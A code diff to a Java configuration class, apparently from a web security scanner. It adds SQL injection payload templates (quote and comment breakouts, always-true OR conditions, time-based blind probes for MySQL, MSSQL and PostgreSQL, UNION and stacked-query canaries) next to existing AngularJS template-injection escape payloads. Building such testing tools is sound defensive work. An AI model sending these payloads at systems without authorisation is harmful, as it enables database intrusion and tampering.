@@ -70,6 +70,21 @@ public class InjectionConfig {
         templates.add(new PayloadTemplate("angular-158-escape", "Angular CSTI", "AngularJS 1.5.8 Escape", "{{x={'a':1};constructor.constructor('alert(\\'{param}\\')')()}}", "Object prototype escape for AngularJS 1.5.8", false));
         templates.add(new PayloadTemplate("angular-14-eval", "Angular CSTI", "AngularJS 1.4 $eval Escape", "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(\\'{param}\\');//');}}", "Prototype pollution eval escape for AngularJS 1.4", false));
 
+        // ── SQL Injection Templates ──
+        // Enabled by default: probes that generate immediate, observable syntax errors.
+        // Time-based and UNION templates are disabled by default to avoid unintentional delays or loud traffic.
+        templates.add(new PayloadTemplate("sqli-single-quote",     "SQL Injection", "Single Quote Probe",              "{value}'",                              "Appends a single quote to break SQL string context",                              true));
+        templates.add(new PayloadTemplate("sqli-comment-dash",     "SQL Injection", "Comment Breakout (--)",           "{value}'--",                            "Single quote + MySQL/MSSQL line comment to neutralise the remainder of the query", true));
+        templates.add(new PayloadTemplate("sqli-comment-hash",     "SQL Injection", "Comment Breakout (#)",            "{value}'#",                             "Single quote + MySQL hash comment",                                               true));
+        templates.add(new PayloadTemplate("sqli-bool-true",        "SQL Injection", "Boolean True (OR '1'='1')",       "{value}' OR '1'='1",                    "Classic always-true boolean condition (string context)",                           true));
+        templates.add(new PayloadTemplate("sqli-bool-true-cmt",    "SQL Injection", "Boolean True + Comment",          "{value}' OR 1=1--",                     "Boolean true with trailing comment to suppress the remaining query",               true));
+        templates.add(new PayloadTemplate("sqli-double-quote",     "SQL Injection", "Double Quote Probe",              "{value}\"",                             "Triggers error in double-quoted SQL identifier context",                           true));
+        templates.add(new PayloadTemplate("sqli-time-mysql",       "SQL Injection", "Time-Based Blind (MySQL)",        "{value}' AND SLEEP(5)--",               "Blind time-based detection probe for MySQL",                                      false));
+        templates.add(new PayloadTemplate("sqli-time-mssql",       "SQL Injection", "Time-Based Blind (MSSQL)",        "{value}'; WAITFOR DELAY '0:0:5'--",     "Blind time-based detection probe for Microsoft SQL Server",                       false));
+        templates.add(new PayloadTemplate("sqli-time-pg",          "SQL Injection", "Time-Based Blind (PostgreSQL)",   "{value}'; SELECT pg_sleep(5)--",        "Blind time-based detection probe for PostgreSQL",                                 false));
+        templates.add(new PayloadTemplate("sqli-union-canary",     "SQL Injection", "UNION SELECT Canary",             "{value}' UNION SELECT NULL--",          "Minimal UNION probe to test for injectable column count",                         false));
+        templates.add(new PayloadTemplate("sqli-stacked",          "SQL Injection", "Stacked Query Probe",             "{value}'; SELECT 1--",                  "Stacked query canary for databases that support multiple statements",              false));
+
         notifyChange();
     }
 
